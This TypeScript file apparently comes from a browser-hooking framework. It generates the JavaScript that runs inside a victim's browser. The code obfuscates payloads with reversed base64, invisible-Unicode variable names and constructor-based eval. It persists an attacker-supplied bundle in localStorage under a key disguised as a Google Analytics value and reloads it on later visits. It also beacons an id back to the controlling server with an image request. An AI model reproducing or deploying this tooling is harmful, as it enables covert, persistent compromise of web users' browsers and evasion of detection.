const btoa = require('btoa')
const uuidv4 = require('uuid/v4')

const parseAutoExecute = (code: string, debug: boolean = false) =>
  code
    ? debug
      ? `addEventListener('injectify', function (){\n// Auto execute code:\n${code}\n})\n\n`
      : `addEventListener('injectify',function(){${code}\n});`
    : ''

const scramble = (code, debug) =>
  code
    ? debug
      ? code
      : `(function _(ﾠ,ﾠ‍,ﾠ‍‍,ﾠ‍‍‍){_.constructor('crypto',ﾠ("${btoa(code)
          .split('')
          .reverse()
          .join(
            ''
          )}"[ﾠ‍‍‍]('')[ﾠ‍]()[ﾠ‍‍]('')))()})(ﾠ=atob,ﾠ('cmV2ZXJzZQ=='),ﾠ('am9pbg=='),ﾠ('c3BsaXQ='))`
    : ''

/**
 * Transforms queries into Client-side core commands
 */
export var Transforms = {
  auth: (id: string, hash: string) => {
    return `var Y=(window.ws||window.i‍),X=Y.url.split('/'),V='https://';'ws:'===X[0]&&(V='http://'),X=V+X[2];var M=new Image;M.src=X+'/a?id=${encodeURIComponent(
      id
    )}&z=${uuidv4()}&t='+(navigator.cookieEnabled&&Storage&&localStorage.ga_&&${JSON.stringify(
      hash
    )}==localStorage.ga_.substr(0,32)?1:0),M.onload`
  },

  cache: (variables: any, debug: boolean, autoexecute: string | null) => {
    /**
     * Merge Core loader with auto-execute code
     */
    const code = `${parseAutoExecute(autoexecute, debug)}with(${JSON.stringify(
      variables
    )})eval(decodeURI(atob(localStorage.ga_.substr(32).split('\\u0410').reverse().join('4'))))`

    /**
     * Code obfuscator
     */
    return scramble(code, debug)
  },

  core: (
    core: { bundle: string; hash: string },
    variables: any,
    debug: boolean,
    autoexecute: string | null
  ) => {
    return `${scramble(
      parseAutoExecute(autoexecute),
      debug
    )};var K=${JSON.stringify(core.bundle)};with(${JSON.stringify(
      variables
    )})eval(K),navigator.cookieEnabled&&void 0!==Storage&&(localStorage.ga_=${JSON.stringify(
      core.hash
    )}+btoa(encodeURI(K)).split('4').reverse().join('\u0410'))`
  }
}
